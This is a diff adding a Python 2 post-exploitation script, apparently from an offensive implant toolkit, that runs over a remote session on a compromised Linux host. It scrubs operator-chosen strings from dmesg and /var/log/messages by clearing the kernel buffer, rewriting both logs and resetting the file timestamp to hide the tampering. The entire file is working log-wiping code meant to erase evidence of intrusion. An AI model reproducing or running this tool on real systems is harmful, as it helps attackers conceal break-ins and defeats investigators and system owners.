@@ -1,0 +1,175 @@
+#!/usr/bin/env python
+VERSION = '1.0.0.6'
+
+import os
+import sys
+import shlex
+import traceback
+import time
+import re
+
+import autoutils
+from autoutils import COLOR
+from autoutils import OptParser
+
+import cdate
+
+class autodclean:
+
+    def __init__(self):
+
+        self.version = VERSION
+        self.nopen = autoutils.autoutils()
+        self.parser = self.get_arg_parser()
+        self.doprint = self.nopen.doprint
+	self.doit = self.nopen.doit
+        self.doitwrite = self.nopen.doitwrite
+
+
+    def main(self, argv):
+
+        argv = argv[1:]
+        opts, args = self.nopen.parseArgs(self.parser, argv)
+
+        if len(argv) < 1:
+            self.parser.print_help()
+            return self.nopen.finish()
+
+        # connect to autoport after parse args
+        if not self.nopen.connected:
+            self.nopen.connect()
+
+        if 'SunOS' in self.nopen.nopen_serverinfo:
+            self.doprint(COLOR['fail'], 'BAIL: -gs dclean is not necessary on Solaris platforms, as dmesg just reads from /var/adm/messages!')
+            return self.nopen.finish()
+
+        if 'Linux' not in self.nopen.nopen_serverinfo:
+            self.doprint(COLOR['fail'], 'BAIL: -gs dclean is not supported on this:\n\n%s\n\n' % self.nopen.nopen_serverinfo)
+            return self.nopen.finish()
+
+        output, nopenlines, outputlines = self.doit('-ls /dev/kmsg')
+        if not output.startswith('crw'):
+            self.doprint(COLOR['fail'], 'Error: there\'s no /dev/kmsg, so we can\'t clean on this target!')
+            return self.nopen.finish()
+            
+        self.nopen.hidden_dir = self.nopen.getHidden()
+        
+        if opts.DISP:
+            output, nopenlines, outputlines = self.doit('dmesg')
+
+        if opts.TEST:
+            print "test: %s" % fixString(opts.TEST)
+            badstring = fixString(opts.TEST)
+            output, nopenlines, outputlines = self.doit('dmesg | egrep "%s" 2>/dev/null' % badstring)
+            output2, nopenlines2, outputlines2 = self.doit('egrep "%s" /var/log/messages 2>/dev/null' % badstring)
+            self.doprint(COLOR['normal'], 'Logs of interest\n================\n\nFrom dmesg:\n%s\n\nFrom /var/log/messages:\n%s' % (output,output2))
+
+
+        if opts.CLEAN:
+            hiddenDirArray = self.nopen.getHidden()
+            if len(hiddenDirArray) > 0:
+                self.nopen.hidden_dir = hiddenDirArray[0]
+            elif opts.TMPDIR:
+                self.nopen.hidden_dir = opts.TMPDIR
+            else:
+                self.doprint(COLOR['fail'], 'No hidden directory found or provided, using /tmp instead')
+                self.nopen.hidden_dir = '/tmp'
+            self.doprint(COLOR['fail'], 'Using the working directory %s for cleaning' % self.nopen.hidden_dir)
+            badstring = fixString(opts.CLEAN)
+            output, nopenlines, outputlines = self.doit('dmesg | egrep "%s"' % badstring)
+            # Hold it - do we see timestamps?
+            dmesgTimestamps = 0
+            if re.match("^\[.*\d{6}\]", outputlines[0]):
+                answer = self.nopen.getInput("So dmesg has a timestamp associated with each log as it was written.  It "+
+                    "is in the form of seconds since boot.\n\nIf you choose to clean these logs, every log will be updated "+
+                    "with a current timestamp instead of the timestamp from boot time, to include the boot sequence (usually "+
+                    "0 but will now have the current time).\n\nAre you sure you want to do this?", default='n')
+                if answer.lower() == 'yes' or answer.lower() == 'y':
+                    dmesgTimestamps = 1
+                else:
+                    self.doprint(COLOR['fail'], 'BAILED.')
+                    return self.nopen.finish()
+            output2, nopenlines2, outputlines2 = self.doit('cat /var/log/messages | egrep "%s"' % badstring)
+            self.doprint(COLOR['fail'], 'From dmesg:\n%s\n\nFrom /var/log/messages:\n%s' % (output,output2))
+            answer = self.nopen.getInput('Is this what you want to clean?', default='n')
+            if answer.lower() == 'yes' or answer.lower() == 'y':
+                dmesg_tmpfilename = self.nopen.tmpfilename("%s/.d" % self.nopen.hidden_dir)
+                messages_tmpfilename = self.nopen.tmpfilename("%s/.m" % self.nopen.hidden_dir)
+                output, outfilename = self.doitwrite('dmesg')
+                fd = open(outfilename,'r')
+                for i, l in enumerate(fd):
+                    pass
+                dmesg_numlines = i-1
+                messages_numlines = self.doit('cat /var/log/messages | wc -l')
+                self.doit('cat /var/log/messages | egrep -v "%s" > %s' % (badstring,messages_tmpfilename))
+                if dmesgTimestamps:
+                    self.doit('dmesg -c | sed "s,^\[.*[0-9]\{6\}] ,,g" | egrep -v "%s" > %s' % (badstring, dmesg_tmpfilename))
+                else:
+                    self.doit('dmesg -c | egrep -v "%s" > %s' % (badstring, dmesg_tmpfilename))
+                dmesg_new_numlines = self.doit('cat %s | wc -l' % dmesg_tmpfilename)
+                self.doit('while IFS= read line; do echo "$line" > /dev/kmsg; done < %s' % dmesg_tmpfilename)
+                total_new_lines = int(messages_numlines[0])+int(dmesg_new_numlines[0])
+                output, nopenlines, outputlines = self.doit('cat /var/log/messages | wc -l')
+                messages_new_numlines = int(output)
+                while messages_new_numlines < total_new_lines:
+                    self.doprint('Sleeping for 5s to wait for messages to update...')
+                    time.sleep(5)
+                    output2, nopenlines2, outputlines2 = self.doit('cat /var/log/messages | wc -l')
+                    if int(output2) == messages_new_numlines:
+                        break
+                    messages_new_numlines = int(output2)
+                self.doit('cat %s > /var/log/messages' % messages_tmpfilename)
+                self.doit('rm %s %s' % (messages_tmpfilename,dmesg_tmpfilename))
+                output, nopenlines, outputlines = self.doit("-tail -1 /var/log/messages")
+                output2, nopenlines2, outputline2 = self.doit("date +%z")
+                mydate = "%s %s" % (' '.join(output.split()[:3]), output2)
+                epochTime, touchTime, sulogTime, stringTime = cdate.convert(mydate)
+                if epochTime: 
+                    self.doit('-touch %s:%s /var/log/messages' % (epochTime, epochTime))
+                    self.doprint(COLOR['success'], '\n\n\tCleaned dmesg and /var/log/messages successfully.\n\n')
+                else:
+                    self.doprint(COLOR['fail'], '\n\n\tCleaned dmesg and /var/log/messages successfully, but couldn\'t touch back the times!\n\n')
+
+            else:
+                self.doprint(COLOR['fail'], 'BAILED.')
+
+        return self.nopen.finish()
+
+
+    def get_arg_parser(self):
+
+        epilog = '\n-gs dclean version %s\n' % self.version
+
+        parser = OptParser(usage='usage: -gs dclean [options]', epilog=epilog)
+
+        parser.add_option('-s', dest='DISP', action='store_true', help='Show dmesg')
+        parser.add_option('-t', dest='TEST', metavar='string', type='string', action='store', help='Test a grepout of a string')
+        parser.add_option('-c', dest='CLEAN', metavar='string', type='string', action='store', help='Clean a particular string out of dmesg')
+        parser.add_option('-l', dest='TMPDIR', metavar='dir', type='string', action='store', help='Temporary directory if no hidden directory exists (default: /tmp)')
+
+        return parser
+
+def replace_all(text, dic):
+    for i, j in dic.iteritems():
+        text = text.replace(i, j)
+    return text
+
+def fixString(text):
+    replaceme = {'(':'.',
+                 ')':'.',
+                }
+    return replace_all(text, replaceme)
+
+
+if __name__ == '__main__':
+
+    try:
+        # re-set the argv b/c NOPEN will do weird things with splitting args
+        argv = shlex.split(' '.join(sys.argv))
+        autodclean().main(argv)
+    except Exception, e:
+        print '\n\n%sUnhandled python exception: %s%s\n\n' % \
+            (COLOR['bad'], str(e), COLOR['normal'])
+        print '%sStack trace:\n' % COLOR['fail']
+        traceback.print_exc()
+        print COLOR['normal']
